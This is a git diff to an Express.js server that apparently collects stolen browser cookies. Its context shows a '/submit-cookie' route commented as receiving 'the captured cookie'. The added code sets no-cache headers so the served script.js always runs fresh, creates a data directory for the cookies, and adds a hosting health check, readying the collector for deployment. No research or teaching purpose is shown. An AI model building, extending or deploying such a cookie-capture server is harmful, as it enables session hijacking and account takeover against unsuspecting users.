@@ -5,8 +5,33 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // Serve static files from the 'static' directory
-app.use(express.static(path.join(__dirname, "static")));
+app.use(
+  express.static(path.join(__dirname, "static"), {
+    // Set headers to prevent caching for always fresh script execution
+    setHeaders: (res, path) => {
+      // For script.js, set aggressive no-cache headers
+      if (path.endsWith("script.js")) {
+        res.set(
+          "Cache-Control",
+          "no-store, no-cache, must-revalidate, private"
+        );
+        res.set("Pragma", "no-cache");
+        res.set("Expires", "0");
+      }
+    },
+  })
+);
 app.use(express.json());
+
+// Create data directory if it doesn't exist on startup
+try {
+  const cookiesDir = path.join(__dirname, "data");
+  if (!fs.existsSync(cookiesDir)) {
+    fs.mkdirSync(cookiesDir, { recursive: true });
+  }
+} catch (error) {
+  console.error("Error creating data directory:", error);
+}
 
 // Route to receive the captured cookie
 app.post("/submit-cookie", (req, res) => {
@@ -120,7 +145,19 @@ function getBrowserInfo(userAgent) {
 
 // Default route serves index.html
 app.get("/", (req, res) => {
+  // Set headers to prevent caching for immediate script execution
+  res.setHeader(
+    "Cache-Control",
+    "no-store, no-cache, must-revalidate, private"
+  );
+  res.setHeader("Pragma", "no-cache");
+  res.setHeader("Expires", "0");
   res.sendFile(path.join(__dirname, "static", "index.html"));
+});
+
+// Health check endpoint for hosting providers
+app.get("/health", (req, res) => {
+  res.status(200).send("OK");
 });
 
 // Start the server
